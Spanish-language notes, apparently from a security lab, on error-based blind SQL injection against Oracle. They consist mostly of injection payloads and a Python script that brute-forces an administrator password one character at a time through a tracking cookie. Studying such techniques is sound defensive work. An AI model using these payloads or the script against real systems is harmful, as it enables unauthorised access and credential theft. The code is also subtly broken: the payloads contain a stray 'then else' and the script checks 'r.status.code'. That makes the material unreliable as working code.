# Inyección SQL Blind con Error Condicional 

Tags: #SQLI #Oracle  #BurpSuite 

```bash 
En una SQLi basada en errores debes observar si el servidor:

- Devuelve errores SQL visibles
- Revela nombres de columnas, tablas o estructuras internas
- Reacciona diferente al cambiar condiciones lógicas
- Se puede observar errores en los codigos de estado '500=Internal Server Error', '200=Ok' 
```

```mysql  
❯ ' order by 1 -- -       # Conocer el numero de columnas 
❯ ' union select NULL from dual -- - 

❯ ' ||(select 'a' from dual)||'    # Dual es una tabla por default en Oracle 
❯ ' ||(select case when(1=1) then to_char(1/0) then else '' end from dual)||'  # La condición dice que pasará algo o de lo contrario pasará otra cosa

# Cuando la condición en este caso sea verdadera mostrará un error '500' y cuando no mostrará un '200'
❯ ' ||(select case when(1=1) then to_char(1/0) then else '' end from users where username='administrator')||'

❯ ' ||(select case when substr(username,1,1)='a' then to_char(1/0) then else '' end from users where username='administrator')||'
```

### Conocer la password 

```mysql 
# Conocer la longitud de la password 
❯ ' ||(select case when length(password)=20 then to_char(1/0) then else '' end from users where username='administrator')||'

❯ ' ||(select case when substr(password,1,1)='a' then to_char(1/0) then else '' end from users where username='administrator')||'
```

```python 
#!/usr/bin/env python3

from pwn import *
import requests
import signal
import sys
import time
import string
import pdb


def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "https://localhost/searchUsers.php"
characters = string.ascii_letters + string.digits    # Se puede colocar string.printable

def MakeSQLI():

    password = ""
    p1 = log.progress("SQLi")
    p1.status("Iniciando fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Password")

    for position in range(1, 21):
	    for character in characters:
		    cookies = {
			    "TrackingId": "valor ' ||(select case when substr(password,%d,1)='%s' then to_char(1/0) then else '' end from users where username='administrator')||" % (position, character),
			    "session": "valor"           # El valor se obtiene de Burpsuite
		    }
		    p1.status(cookies['TrackingId'])
		    r = requests.get(main_url, cookies=cookies)
		    if r.status.code == 500:   # Si el codigo de estado es 500 
			    password += character
			    p2.status(password)
			    break

if __name__ == '__main__':
    MakeSQLI()
```